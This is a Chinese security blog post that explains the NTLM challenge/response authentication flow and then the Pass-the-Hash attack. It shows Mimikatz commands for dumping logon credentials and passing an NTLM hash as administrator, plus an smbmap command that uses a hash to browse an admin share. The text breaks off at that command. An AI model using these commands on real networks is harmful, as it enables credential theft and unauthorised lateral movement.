<!doctype html><html lang=zh-cn><head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#"><meta charset=utf-8><meta name=generator content="Hugo 0.100.2"><meta name=theme-color content="#fff"><meta name=color-scheme content="light dark"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=format-detection content="telephone=no, date=no, address=no, email=no"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><title>NTLM 认证协议到 Pass The Hash 攻击 | zjun's blog</title><link rel=stylesheet href=/css/meme.min.css><script src=/js/meme.min.js></script><meta name=author content="zjun"><meta name=description content="NTLM 是一种网络认证协议，与 NTLM Hash 的关系就是：NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。 0x01 NTLM 协议 In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. NTLM is……"><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=mask-icon href=/icons/safari-pinned-tab.svg color=#fff><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-title content="zjun's blog"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=mobile-web-app-capable content="yes"><meta name=application-name content="zjun's blog"><meta name=msapplication-starturl content="../../"><meta name=msapplication-TileColor content="#fff"><meta name=msapplication-TileImage content="../../icons/mstile-150x150.png"><link rel=manifest href=/manifest.json><link rel=canonical href=https://blog.zjun.info/tech/ntlm-authentication-to-pth-attack/><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2020-08-25T12:50:05+00:00","dateModified":"2022-04-02T12:53:25+08:00","url":"https://blog.zjun.info/tech/ntlm-authentication-to-pth-attack/","headline":"NTLM 认证协议到 Pass The Hash 攻击","description":"NTLM 是一种网络认证协议，与 NTLM Hash 的关系就是：NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。 0x01 NTLM 协议 In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. NTLM is……","inLanguage":"zh-CN","articleSection":"tech","wordCount":1434,"image":["https://oss.zjun.info/zjun.info/20210607093842.png","https://oss.zjun.info/zjun.info/2.png","https://oss.zjun.info/zjun.info/3.png","https://oss.zjun.info/zjun.info/4.png","https://oss.zjun.info/zjun.info/5.png","https://oss.zjun.info/zjun.info/6.png","https://oss.zjun.info/zjun.info/7.png","https://oss.zjun.info/zjun.info/8.png","https://oss.zjun.info/zjun.info/9.png"],"publisher":{"@type":"Organization","name":"zjun's blog","logo":{"@type":"ImageObject","url":"https://blog.zjun.info/icons/apple-touch-icon.png"},"url":"https://blog.zjun.info/"},"mainEntityOfPage":{"@type":"WebSite","@id":"https://blog.zjun.info/"}}</script><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@zjuninfo"><meta property="og:title" content="NTLM 认证协议到 Pass The Hash 攻击"><meta property="og:description" content="NTLM 是一种网络认证协议，与 NTLM Hash 的关系就是：NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。 0x01 NTLM 协议 In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. NTLM is……"><meta property="og:url" content="https://blog.zjun.info/tech/ntlm-authentication-to-pth-attack/"><meta property="og:site_name" content="zjun's blog"><meta property="og:locale" content="zh"><meta property="og:image" content="https://oss.zjun.info/zjun.info/20210607093842.png"><meta property="og:type" content="article"><meta property="article:published_time" content="2020-08-25T12:50:05+00:00"><meta property="article:modified_time" content="2022-04-02T12:53:25+08:00"><meta property="article:section" content="tech"><link rel=preconnect href=https://www.google-analytics.com crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-8C6SESQST4"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-8C6SESQST4')</script></head><body><div class=container><header class=header><div class=header-wrapper><div class="header-inner single"><div class=site-brand><a href=/ class=brand>zjun's blog</a></div><nav class=nav><ul class=menu id=menu><li class="menu-item active"><a href=/tech/><span class=menu-item-name>文章</span></a></li><li class=menu-item><a href=/links/><span class=menu-item-name>友链</span></a></li><li class=menu-item><a href=/about/><span class=menu-item-name>关于</span></a></li><li class=menu-item><a href=https://tools.zjun.info><span class=menu-item-name>在线工具</span></a></li><li class=menu-item><a href=https://github.com/z1un><span class=menu-item-name>Github</span></a></li><li class=menu-item><a href=https://twitter.com/zjuninfo><span class=menu-item-name>Twitter</span></a></li><li class=menu-item><a id=theme-switcher href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5 242 7a18 18 0 0128 0l48.8 97.5L422.2 70A18 18 0 01442 89.8l-34.5 103.4L505 242a18 18 0 010 28l-97.5 48.8L442 422.2A18 18 0 01422.2 442l-103.4-34.5L270 505a18 18 0 01-28 0l-48.8-97.5L89.8 442A18 18 0 0170 422.2l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8L70 89.8A18 18 0 0189.8 70zM256 128a128 128 0 10.01.0M256 160a96 96 0 10.01.0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412A256 256 0 10181 5a11.5 11.5.0 00-5 20A201.5 201.5.0 0142 399a11.5 11.5.0 00-15 13"/></svg></a></li></ul></nav></div></div><input type=checkbox id=nav-toggle aria-hidden=true>
<label for=nav-toggle class=nav-toggle></label>
<label for=nav-toggle class=nav-curtain></label></header><main class="main single" id=main><div class=main-inner><article class="content post h-entry" data-align=justify data-type=tech data-toc-num=true><h1 class="post-title p-name">NTLM 认证协议到 Pass The Hash 攻击</h1><div class=post-meta><time datetime=2020-08-25T12:50:05+00:00 class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon post-meta-icon"><path d="M402.3 344.9l32-32c5-5 13.7-1.5 13.7 5.7V464c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h273.5c7.1.0 10.7 8.6 5.7 13.7l-32 32c-1.5 1.5-3.5 2.3-5.7 2.3H48v352h352V350.5c0-2.1.8-4.1 2.3-5.6zm156.6-201.8L296.3 405.7l-90.4 10c-26.2 2.9-48.5-19.2-45.6-45.6l10-90.4L432.9 17.1c22.9-22.9 59.9-22.9 82.7.0l43.2 43.2c22.9 22.9 22.9 60 .1 82.8zM460.1 174 402 115.9 216.2 301.8l-7.3 65.3 65.3-7.3L460.1 174zm64.8-79.7-43.2-43.2c-4.1-4.1-10.8-4.1-14.8.0L436 82l58.1 58.1 30.9-30.9c4-4.2 4-10.8-.1-14.9z"/></svg>&nbsp;2020.8.25</time>
<span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ class="category-link p-category">网络安全</a></span></div><nav class=contents><h2 id=contents class=contents-title>目录</h2><ol class=toc><li><a id=contents:0x01-ntlm-协议 href=#0x01-ntlm-协议>0x01 NTLM 协议</a><ol><li><a id=contents:1-协商 href=#1-协商>1. 协商</a></li><li><a id=contents:2-质询 href=#2-质询>2. 质询</a></li><li><a id=contents:3-身份验证 href=#3-身份验证>3. 身份验证</a></li></ol></li><li><a id=contents:0x02-pass-the-hash-攻击 href=#0x02-pass-the-hash-攻击>0x02 Pass The Hash 攻击</a><ol><li><a id=contents:1-原理 href=#1-原理>1. 原理</a></li><li><a id=contents:2-攻击利用 href=#2-攻击利用>2. 攻击利用</a><ol><li><a id=contents:mimikatz href=#mimikatz>Mimikatz</a></li><li><a id=contents:smbmap href=#smbmap>Smbmap</a></li><li><a id=contents:wmiexec href=#wmiexec>Wmiexec</a></li><li><a id=contents:metasploit-psexec-模块 href=#metasploit-psexec-模块>Metasploit psexec 模块</a></li></ol></li></ol></li></ol></nav><div class="post-body e-content"><p style=text-indent:0><span class=drop-cap>N</span>TLM 是一种网络认证协议，与 NTLM Hash 的关系就是：NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。</p><h2 id=0x01-ntlm-协议><a href=#0x01-ntlm-协议 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:0x01-ntlm-协议 class=headings>0x01 NTLM 协议</a></h2><blockquote><p>In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. NTLM is the successor to the authentication protocol in Microsoft LAN Manager (LANMAN), an older Microsoft product. The NTLM protocol suite is implemented in a Security Support Provider, which combines the LAN Manager authentication protocol, NTLMv1, NTLMv2 and NTLM2 Session protocols in a single package. Whether these protocols are used or can be used on a system is governed by Group Policy settings, for which different versions of Windows have different default settings. NTLM passwords are considered weak because they can be brute-forced very easily with modern hardware.</p></blockquote><p>这段话摘自：</p><p><a href=https://en.wikipedia.org/wiki/NT_LAN_Manager target=_blank rel=noopener>https://en.wikipedia.org/wiki/NT_LAN_Manager</a></p><p>大概说到 <code>NTLM</code> 协议是 <code>LM</code>（LAN Manager）协议的后继产品，其协议套件中包含 <code>LM</code> 、 <code>NTLM v1</code> 、 <code>NTLM v2</code> 和 <code>NTLM2 Session</code> 四种协议，具体该使用哪一种由组策略决定。不同版本的 <code>Windows</code> 版本具有不同的默认设置。其中也提到了 <code>NTLM</code> 协议是一种不安全的认证模式。</p><p><code>NTLM</code> 基于 <code>Challenge/Response</code>（质询/响应）认证机制。整个认证流程分为三部分： <code>协商</code> ， <code>质询</code> 和 <code>身份验证</code> 。</p><h3 id=1-协商><a href=#1-协商 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:1-协商 class=headings>1. 协商</a></h3><p>客户端向服务器发送协商消息，此消息允许客户端向服务器指定其支持的 <code>NTLM</code> 选项，其中就包括需要登陆的用户名，协议版本信息，签名等等。可详见官方文档<a href=https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2 target=_blank rel=noopener>NEGOTIATE_MESSAGE</a></p><h3 id=2-质询><a href=#2-质询 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:2-质询 class=headings>2. 质询</a></h3><p>这一个过程中服务器接收到了客户端的协商信息，服务器会产生一个 <code>Challenge</code> ，之后加密验证会依赖于 <code>Challenge</code> 。</p><blockquote><p><strong>challenge</strong>: A piece of data used to authenticate a user. Typically a challenge takes the form of a <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/780943e9-42e6-4dbe-aa87-1dce828ba82a#gt_001c0e40-0980-417d-853c-f7cb34ba6d3b target=_blank rel=noopener>nonce</a>.</p></blockquote><p>这是来自微软官方的解释，就是说 <code>Challenge</code> 是用于验证用户身份的一条数据。通常， <code>Challenge</code> 采用随机数的形式。</p><pre tabindex=0><code>NTLM v1 这里生成的是 8 位的 Challenge，而 NTLM v2 是 16 位的 Challenge。
</code></pre><p>服务器使用登录用户名对应的 <code>NTLM Hash</code> 加密 <code>Challenge</code> ， 得到一个 <code>Net NTLM Hash</code> 。同时将之前生成的随机数 <code>Challenge</code> 等信息发送给客户端。</p><p>客户端接受到 <code>Challenge</code> 后，使用将要登录到账户对应的 <code>NTLM Hash</code> 加密 <code>Challenge</code> 生成 <code>Response</code> ，然后将 <code>Response</code> 等信息发送至服务器端。</p><pre tabindex=0><code>NTLM v1 这里的加密算法采用 DES，NTLM v2 采用 HMAC-MD5。
</code></pre><h3 id=3-身份验证><a href=#3-身份验证 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:3-身份验证 class=headings>3. 身份验证</a></h3><p>服务器端接收到客户端发送的 <code>Response</code> ，将 <code>Response</code> 与自己计算得出的 <code>Net NTLM Hash</code> 进行比较，如果相等，则认证通过。</p><p><img src=https://oss.zjun.info/zjun.info/20210607093842.png alt=1></p><h2 id=0x02-pass-the-hash-攻击><a href=#0x02-pass-the-hash-攻击 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:0x02-pass-the-hash-攻击 class=headings>0x02 Pass The Hash 攻击</a></h2><h3 id=1-原理><a href=#1-原理 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:1-原理 class=headings>1. 原理</a></h3><p>前面说到了 <code>Windows</code> 的网络认证，依靠 <code>NTLM</code> 协议，是一种点对点的认证交互模式，没有类似于 <code>Kerberos</code> 协议的信托机构。</p><p>并且在验证过程中也是没有使用到明文密码的，可以发现在客户端向服务端发起身份验证中主要的认证步骤在于向服务端发送 <code>Response</code> ，这意味着在某一种情况下，你在工作组或域环境中拿到了一台主机的权限，并读到了它的 <code>NTLM hash</code> 或 <code>LM hash</code> ，这时想要破解出明文密码可能会有难度，所以你选择依靠这个 <code>hash</code> ，在工作组或域内登陆更多的主机，因为在内网，密码一致的情况非常常见。</p><p>所以你可以伪装成客户端向服务端发起 <code>NTLM</code> 协议的认证，通过服务端对客户端发送的 <code>Challenge</code> 再加上你得到的 <code>hash</code> ，生成一个 <code>Response</code> ，就可以完整实现整个认证流程。</p><p>这个攻击方式就称为哈希传递（Pass The Hash）。</p><h3 id=2-攻击利用><a href=#2-攻击利用 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:2-攻击利用 class=headings>2. 攻击利用</a></h3><p>下面介绍几种利用方式</p><h4 id=mimikatz><a href=#mimikatz class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:mimikatz class=headings>Mimikatz</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>privilege::debug
</span></span><span class=line><span class=cl>sekurlsa::logonpasswords
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/2.png alt=2></p><p>利用当前的 <code>NTLM hash</code> 进行传递：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sekurlsa::pth /user:administrator /domain:zjun.com /ntlm:79c89e2e7418467a4e7b55f8307260ca
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/3.png alt=3></p><h4 id=smbmap><a href=#smbmap class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:smbmap class=headings>Smbmap</a></h4><p><a href=https://github.com/ShawnDEvans/smbmap target=_blank rel=noopener>SMBMap</a>是一个 <code>SMB</code> 枚举工具，功能很强大，可以命令执行，同时也支持哈希传递。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 smbmap.py -u administrator -p <span class=s1>&#39;00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca&#39;</span> -H 192.168.21.200 -r <span class=s1>&#39;C$\Users&#39;</span>
